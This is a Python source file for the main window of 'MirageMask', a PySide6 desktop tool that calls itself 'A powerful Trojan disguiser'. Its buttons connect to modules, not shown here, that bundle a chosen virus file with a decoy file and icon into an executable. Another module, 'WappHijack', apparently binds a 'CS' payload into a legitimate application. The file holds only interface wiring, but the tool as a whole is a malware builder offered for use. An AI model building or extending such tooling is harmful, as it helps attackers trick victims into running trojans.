# ///////////////////////////////////////////////////////////////
#
# BY: WANDERSON M.PIMENTA
# PROJECT MADE WITH: Qt Designer and PySide6
# V: 1.0.0
#
# This project can be used freely for all uses, as long as they maintain the
# respective credits only in the Python scripts, any information in the visual
# interface (GUI) can be modified without any implication.
#
# There are limitations on Qt licenses if you want to use your products
# commercially, I recommend reading them on the official website:
# https://doc.qt.io/qtforpython/licenses.html
#
# ///////////////////////////////////////////////////////////////

import sys
import os
import platform

# IMPORT / GUI AND MODULES AND WIDGETS
# ///////////////////////////////////////////////////////////////
from modules import *
from widgets import *
os.environ["QT_FONT_DPI"] = "96" # FIX Problem for High DPI and Scale above 100%

# ///////////////////////////////////////////////////////////////
#Gui功能
from GUIfunction.virus_creat.virus_creat import Virus_creat
from GUIfunction.WappHijack.main import *
from GUIfunction.UIFunctions import UpInfo
#///////////////////////////////////////////////////////////////


#///////////////////////////////////////////////////////////////

# SET AS GLOBAL WIDGETS
# ///////////////////////////////////////////////////////////////
widgets = None

class MainWindow(QMainWindow):
    def __init__(self):
        QMainWindow.__init__(self)

        # SET AS GLOBAL WIDGETS
        # ///////////////////////////////////////////////////////////////
        self.ui = Ui_MainWindow()
        self.ui.setupUi(self)
        global widgets
        widgets = self.ui

        # USE CUSTOM TITLE BAR | USE AS "False" FOR MAC OR LINUX
        # ///////////////////////////////////////////////////////////////
        Settings.ENABLE_CUSTOM_TITLE_BAR = True

        # 程序名称
        # ///////////////////////////////////////////////////////////////
        title = "MirageMask"
        description = "A powerful Trojan disguiser"
        # APPLY TEXTS
        self.setWindowTitle(title)
        widgets.titleRightInfo.setText(description)

        # TOGGLE MENU
        # ///////////////////////////////////////////////////////////////
        widgets.toggleButton.clicked.connect(lambda: UIFunctions.toggleMenu(self, True))

        # SET UI DEFINITIONS
        # ///////////////////////////////////////////////////////////////
        UIFunctions.uiDefinitions(self)

        # QTableWidget PARAMETERS
        # ///////////////////////////////////////////////////////////////
        widgets.tableWidget.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)

        # BUTTONS CLICK
        # ///////////////////////////////////////////////////////////////

        # 右侧切换页面按钮
        widgets.btn_home.clicked.connect(self.buttonClick)
        widgets.btn_creat_virus.clicked.connect(self.buttonClick)
        widgets.btn_Wapp_hijack.clicked.connect(self.buttonClick)
        widgets.btn_save.clicked.connect(self.buttonClick)


        #///////////////////////////////////////////////////////////////////////////////////////
        #按钮绑定
        self.button_bind()
        self.UIbotton_bind()
        # ////////////////////////////////////////////////////////////////////////////////////////

        # EXTRA LEFT BOX
        def openCloseLeftBox():
            UIFunctions.toggleLeftBox(self, True)
        widgets.toggleLeftBox.clicked.connect(openCloseLeftBox)
        widgets.extraCloseColumnBtn.clicked.connect(openCloseLeftBox)

        # EXTRA RIGHT BOX
        def openCloseRightBox():
            UIFunctions.toggleRightBox(self, True)
        widgets.settingsTopBtn.clicked.connect(openCloseRightBox)

        # SHOW APP
        # ///////////////////////////////////////////////////////////////
        self.show()

        # SET CUSTOM THEME
        # ///////////////////////////////////////////////////////////////
        useCustomTheme = False
        themeFile = "themes\\py_dracula_light.qss"

        # SET THEME AND HACKS
        if useCustomTheme:
            # LOAD AND APPLY STYLE
            UIFunctions.theme(self, themeFile, True)

            # SET HACKS
            AppFunctions.setThemeHack(self)

        # SET HOME PAGE AND SELECT MENU
        # ///////////////////////////////////////////////////////////////
        widgets.stackedWidget.setCurrentWidget(widgets.home)
        widgets.btn_home.setStyleSheet(UIFunctions.selectMenu(widgets.btn_home.styleSheet()))


    # 按钮点击行为
    # 右侧页面控制按钮绑定信号
    # ///////////////////////////////////////////////////////////////
    def buttonClick(self):
        # GET BUTTON CLICKED
        btn = self.sender()
        btnName = btn.objectName()

        # SHOW HOME PAGE
        if btnName == "btn_home":
            widgets.stackedWidget.setCurrentWidget(widgets.home)
            UIFunctions.resetStyle(self, btnName)
            btn.setStyleSheet(UIFunctions.selectMenu(btn.styleSheet()))

        # SHOW WIDGETS PAGE
        if btnName == "btn_creat_virus":
            widgets.stackedWidget.setCurrentWidget(widgets.virus_creat)
            UIFunctions.resetStyle(self, btnName)
            btn.setStyleSheet(UIFunctions.selectMenu(btn.styleSheet()))

        # SHOW NEW PAGE
        if btnName == "btn_Wapp_hijack":
            widgets.stackedWidget.setCurrentWidget(widgets.Wapp_hijack) # SET PAGE
            UIFunctions.resetStyle(self, btnName) # RESET ANOTHERS BUTTONS SELECTED
            btn.setStyleSheet(UIFunctions.selectMenu(btn.styleSheet())) # SELECT MENU

        if btnName == "btn_save":
            print("Save BTN clicked!")

        if btnName == "choose_disguise_button":
            print("Save BTN clicked!")

        # PRINT BTN NAME
        print(f'Button "{btnName}" pressed!')



    # RESIZE EVENTS
    # ///////////////////////////////////////////////////////////////
    def resizeEvent(self, event):
        # Update Size Grips
        UIFunctions.resize_grips(self)

    # MOUSE CLICK EVENTS
    # ///////////////////////////////////////////////////////////////
    def mousePressEvent(self, event):
        # SET DRAG POS WINDOW
        self.dragPos = event.globalPosition().toPoint()

        # PRINT MOUSE EVENTS
        if event.buttons() == Qt.LeftButton:
            print('Mouse click: LEFT CLICK')
        if event.buttons() == Qt.RightButton:
            print('Mouse click: RIGHT CLICK')


    def UIbotton_bind(self):
        #UI界面的按钮绑定
        widgets.btn_more.clicked.connect(lambda: UpInfo.showUpInfos(self))

    def button_bind(self):
        #virus_creat
        self.vcreat=Virus_creat()
        widgets.choose_disguise_button.clicked.connect(lambda: self.vcreat.set_dfile(self,widgets.choose_disguise_line))
        widgets.choose__button.clicked.connect(lambda: self.vcreat.set_vfile(self, widgets.choose_virus_line))
        widgets.choose_ico_button.clicked.connect(lambda: self.vcreat.set_icofile(self,widgets.choose_ico_line))
        widgets.startcreat_Button.clicked.connect(lambda: self.vcreat.creat_virus_start(widgets.exe_radioButton, widgets.py_radioButton,widgets.set_name_line,self))


        #WappHijack
        self.Wapp=WappHijack()
        widgets.Hijack_app_button.clicked.connect(lambda: self.Wapp.set_App(self, widgets.Hijack_app_line))
        widgets.Hijack_cs_button.clicked.connect(lambda: self.Wapp.set_CS(self, widgets.Hijack_cs_line))
        widgets.WappHijack_start.clicked.connect(lambda: self.Wapp.CreatWapp(widgets.Hijack_name_line,self))







if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setWindowIcon(QIcon("ico.ico"))
    window = MainWindow()
    sys.exit(app.exec())
